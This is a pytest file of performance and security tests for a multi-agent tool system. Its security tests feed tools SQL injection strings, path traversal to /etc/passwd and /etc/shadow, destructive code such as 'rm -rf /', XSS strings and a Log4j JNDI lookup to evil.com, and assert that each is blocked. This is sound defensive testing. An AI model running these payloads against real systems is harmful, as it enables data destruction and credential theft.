"""Performance and security validation tests."""
import pytest
import asyncio
import time
import psutil
import gc
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Any


@pytest.mark.performance
async def test_concurrent_agent_performance():
    """Test system performance under concurrent agent load."""
    from plugins_folder.orchestrator_core import OrchestratorAgent
    from plugins_folder.tools import ToolRegistry, FinishTool
    from llm_connector import LLMClient
    from project_state import ProjectState
    
    # Setup
    llm_client = LLMClient()
    tool_registry = ToolRegistry()
    tool_registry.register_tool(FinishTool())
    
    agents = []
    for i in range(5):  # Create 5 concurrent agents
        agent = OrchestratorAgent(
            agent_id=i,
            name=f"PerfTest_{i}",
            role="Performance Tester",
            tool_registry=tool_registry,
            llm_client=llm_client,
            project_state=ProjectState()
        )
        agents.append(agent)
    
    # Performance test
    start_time = time.time()
    initial_memory = psutil.Process().memory_info().rss
    
    # Run agents concurrently
    tasks = []
    for i, agent in enumerate(agents):
        task = agent.run(
            mission_prompt=f"Complete performance test {i} by finishing with result 'PERF_TEST_{i}_COMPLETE'",
            log_id=i
        )
        tasks.append(task)
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    end_time = time.time()
    final_memory = psutil.Process().memory_info().rss
    
    # Validate results
    execution_time = end_time - start_time
    memory_usage = (final_memory - initial_memory) / 1024 / 1024  # MB
    
    # Assert performance requirements
    assert execution_time < 60, f"Concurrent execution took too long: {execution_time}s"
    assert memory_usage < 500, f"Memory usage too high: {memory_usage}MB"
    
    # Validate all agents completed successfully
    for i, result in enumerate(results):
        assert not isinstance(result, Exception), f"Agent {i} failed: {result}"
        assert isinstance(result, dict), f"Agent {i} returned invalid result type"


@pytest.mark.performance
async def test_memory_leak_detection():
    """Test for memory leaks during extended operation."""
    from project_state import ProjectState
    from plugins_folder.tools import WriteToSharedStateTool, ReadFromSharedStateTool
    
    initial_memory = psutil.Process().memory_info().rss
    
    # Perform many operations to detect leaks
    project_state = ProjectState()
    write_tool = WriteToSharedStateTool(project_state)
    read_tool = ReadFromSharedStateTool(project_state)
    
    for i in range(1000):  # 1000 operations
        # Write operation
        result = write_tool.execute(key=f"test_key_{i}", value=f"test_value_{i}" * 100)
        assert result.get("status") != "error", f"Write failed at iteration {i}"
        
        # Read operation
        result = read_tool.execute(key=f"test_key_{i}")
        assert result.get("status") != "error", f"Read failed at iteration {i}"
        
        # Periodic cleanup test
        if i % 100 == 0:
            gc.collect()
            current_memory = psutil.Process().memory_info().rss
            memory_growth = (current_memory - initial_memory) / 1024 / 1024
            
            # Memory should not grow unboundedly
            assert memory_growth < 100, f"Memory leak detected: {memory_growth}MB growth after {i} operations"


@pytest.mark.security
async def test_sql_injection_protection():
    """Test SQL injection attack protection."""
    from plugins_folder.tools import SQLQueryTool
    
    sql_tool = SQLQueryTool()
    
    # Test various SQL injection attempts
    injection_attempts = [
        "SELECT * FROM Users WHERE id = 1; DROP TABLE Users; --",
        "'; DELETE FROM Documents; --",
        "UNION SELECT password FROM users --",
        "1' OR '1'='1",
        "admin'--",
        "'; EXEC xp_cmdshell('dir'); --"
    ]
    
    for injection in injection_attempts:
        result = await sql_tool.execute(sql_query=injection)
        
        # Should either reject the query or handle it safely
        assert result.get("status") == "error" or "error" in result.get("message", "").lower(), \
            f"SQL injection not properly handled: {injection}"


@pytest.mark.security
async def test_file_path_traversal_protection():
    """Test directory traversal attack protection."""
    from plugins_folder.essential_tools import FileIOTool
    
    file_tool = FileIOTool()
    
    # Test various path traversal attempts
    traversal_attempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
        "../data/../../sensitive_file.txt",
        "data/../../../etc/passwd"
    ]
    
    for path in traversal_attempts:
        result = await file_tool.execute(operation="read", file_path=path)
        
        # Should reject access to paths outside allowed directories
        assert result.get("status") == "error", f"Path traversal not blocked: {path}"
        assert "Access denied" in result.get("message", ""), f"Improper error message for: {path}"


@pytest.mark.security
async def test_code_execution_safety():
    """Test code execution safety measures."""
    from plugins_folder.essential_tools import CodeExecutionTool
    
    code_tool = CodeExecutionTool()
    
    # Test dangerous code patterns
    dangerous_code = [
        "import os; os.system('rm -rf /')",
        "import subprocess; subprocess.call(['del', 'C:\\\\*.*'])",
        "exec('malicious code')",
        "eval('__import__(\"os\").system(\"dangerous\")')",
        "open('/etc/passwd', 'r').read()",
        "__import__('os').system('ls')",
        "compile('dangerous', 'file', 'exec')"
    ]
    
    for code in dangerous_code:
        result = await code_tool.execute(code=code)
        
        # Should reject dangerous code
        assert result.get("status") == "error", f"Dangerous code not blocked: {code}"
        assert any(keyword in result.get("message", "").lower() 
                  for keyword in ["restricted", "dangerous", "compilation"]), \
            f"Improper error message for dangerous code: {code}"


@pytest.mark.security
async def test_web_scraping_safety():
    """Test web scraping safety measures."""
    from plugins_folder.essential_tools import WebScrapingTool
    
    web_tool = WebScrapingTool()
    
    # Test invalid/dangerous URLs
    dangerous_urls = [
        "file:///etc/passwd",
        "ftp://internal-server/sensitive",
        "javascript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>",
        "http://localhost:22/ssh-access",  # Local services
        "http://127.0.0.1:3389/rdp"       # Local services
    ]
    
    for url in dangerous_urls:
        if url.startswith(('file://', 'javascript:', 'data:')):
            # Should reject these schemes entirely
            result = await web_tool.execute(url=url)
            assert result.get("status") == "error", f"Dangerous URL scheme not blocked: {url}"
        else:
            # Local URLs might be blocked by network config, but shouldn't crash
            result = await web_tool.execute(url=url)
            # Just ensure it doesn't crash - network policies will handle blocking
            assert isinstance(result, dict), f"Tool crashed on URL: {url}"


@pytest.mark.performance
async def test_database_connection_pooling():
    """Test database connection management under load."""
    from services.unified_database_service import EnhancedUnifiedSearchService
    
    service = EnhancedUnifiedSearchService()
    
    # Simulate concurrent database operations
    async def db_operation(query_id: int):
        try:
            result = await service.search_all(f"test query {query_id}", limit=1)
            return {"id": query_id, "success": True, "result": result}
        except Exception as e:
            return {"id": query_id, "success": False, "error": str(e)}
    
    # Run 20 concurrent operations
    tasks = [db_operation(i) for i in range(20)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Analyze results
    successful = sum(1 for r in results if not isinstance(r, Exception) and r.get("success"))
    failed = len(results) - successful
    
    # At least 50% should succeed (some may fail due to missing test data, but not connection issues)
    success_rate = successful / len(results)
    assert success_rate >= 0.5, f"Database connection handling failed: {success_rate:.2%} success rate"


@pytest.mark.security
async def test_input_sanitization():
    """Test input sanitization across all tools."""
    from plugins_folder.essential_tools import ValidationTool
    
    validation_tool = ValidationTool()
    
    # Test various malicious inputs
    malicious_inputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j style
        "{{constructor.constructor('return process')().exit()}}",  # Node.js injection
        "eval('malicious')"
    ]
    
    for malicious in malicious_inputs:
        # Test string validation - should not crash
        result = validation_tool.execute(
            data=malicious,
            validation_type="format_check", 
            format_type="email"
        )
        
        assert isinstance(result, dict), f"Tool crashed on malicious input: {malicious}"
        assert result.get("valid") == False, f"Malicious input passed validation: {malicious}"


@pytest.mark.performance
async def test_response_time_requirements():
    """Test response time requirements for critical operations."""
    from plugins_folder.tools import FinishTool, CheckForClarificationsTool
    
    finish_tool = FinishTool()
    clarification_tool = CheckForClarificationsTool()
    
    # Test response times
    operations = [
        ("finish_tool", lambda: finish_tool.execute(response="test")),
        ("clarification", lambda: clarification_tool.execute(query="test query")),
    ]
    
    for name, operation in operations:
        start_time = time.time()
        result = await asyncio.to_thread(operation) if asyncio.iscoroutinefunction(operation) else operation()
        end_time = time.time()
        
        response_time = end_time - start_time
        
        # Critical operations should complete within 5 seconds
        assert response_time < 5.0, f"{name} took too long: {response_time:.2f}s"
        assert isinstance(result, dict), f"{name} returned invalid result type"


@pytest.mark.integration
async def test_system_recovery_from_failures():
    """Test system recovery from various failure scenarios."""
    from plugins_folder.agent_core import SpecialistAgent
    from plugins_folder.tools import ToolRegistry, RAGTool
    from llm_connector import LLMClient
    from project_state import ProjectState
    
    # Create agent with potentially failing tool
    tool_registry = ToolRegistry()
    rag_tool = RAGTool()
    tool_registry.register_tool(rag_tool)
    
    agent = SpecialistAgent(
        agent_id=999,
        name="FailureTestAgent",
        role="Failure Recovery Tester",
        tool_registry=tool_registry,
        llm_client=LLMClient(),
        project_state=ProjectState()
    )
    
    # Test recovery from tool failure
    result = await agent.run(
        mission_prompt="Use the RAG tool with invalid parameters to test error recovery",
        log_id=1,
        system_prompt_template="You are {name} with role {role}. Try to use available tools. If they fail, finish gracefully.",
        update_callback_type_prefix="failure_test"
    )
    
    # Agent should complete despite tool failures
    assert isinstance(result, dict), "Agent should return result even with tool failures"
    assert "final_response" in result, "Agent should have final response"
    
    # Should not crash the system
    assert "error" not in result.get("final_response", "").lower() or \
           "graceful" in result.get("final_response", "").lower(), \
           "Agent should handle failures gracefully"